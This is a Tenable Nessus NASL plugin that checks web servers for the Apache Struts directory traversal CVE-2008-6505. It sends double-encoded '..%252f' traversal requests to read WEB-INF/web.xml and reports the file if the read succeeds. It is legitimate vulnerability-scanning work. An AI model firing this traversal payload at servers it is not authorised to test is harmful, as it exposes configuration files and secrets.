#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(34946);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2008-6505");
  script_bugtraq_id(32104);
  script_xref(name:"OSVDB", value:"49733");
  script_xref(name:"OSVDB", value:"49734");
  script_xref(name:"Secunia", value:"32497");

  script_name(english:"Apache Struts < 2.0.12 / 2.1.3 Dispatcher Directory Traversal");
  script_summary(english:"Tries to read a web.xml");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Java framework that is susceptible to
a directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The remote web server is using Apache Struts, a web application
framework for developing Java EE web applications. 

The version of Apache Struts installed on the remote host fails to
properly decode and normalize the request path before serving static
content.  Using double-encoded directory traversal sequences, an
anonymous remote attacker can leverage this issue to download files
outside the static content folder." );
 script_set_attribute(attribute:"see_also", value:"https://issues.apache.org/struts/browse/WW-2779" );
 script_set_attribute(attribute:"see_also", value:"http://struts.apache.org/2.x/docs/s2-004.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Struts 2.0.12 / 2.1.3 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("webmirror.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


file = 'WEB-INF/web.xml';
file_pat = "^<web-app +id=";


# Iterate over known directories.
dirs = get_kb_list(string("www/", port, "/content/directories"));
if (isnull(dirs)) dirs = make_list("", "/struts2-showcase", "/struts-showcase");

foreach dir (dirs)
{
  # Identify a web app using Struts.
  res = http_send_recv3(
    port   : port, 
    method : "GET",
    item   : string(dir, "/struts/webconsole.html")
  );
  if (isnull(res)) exit(0);

  # If so...
  if (
    "Apache Software Foundation (ASF)" >< res[2] &&
    ">OGNL Console<" >< res[2]
  )
  {
    for (levels=3; levels<8; levels++)
    {
      exploit = string("/struts/", crap(data:"..%252f", length:7*levels), file);
      url = string(dir, exploit);

      res = http_send_recv3(
        port   : port, 
        method : "GET",
        item   : url
      );
      if (res == NULL) exit(0);

      # There's a problem if we get the file we're looking for.
      if (egrep(pattern:file_pat, string:res[2]))
      {
        if (report_verbosity > 0)
        {
          report = string(
            "\n",
            "Nessus was able to exploit the issue to retrieve the contents of\n",
            "'", file, "' on the remote host using the following URL :\n",
            "\n",
            "  ", build_url(port:port, qs:url), "\n"
          );
          if (report_verbosity > 1)
          {
            report += string(
              "\n",
              "Here are the contents :\n",
              "\n",
              "  ", str_replace(find:'\n', replace:'\n  ', string:res[2]), "\n"
            );
          }
          security_warning(port:port, extra:report);
        }
        else security_warning(port);

        exit(0);
      }
    }
  }
}
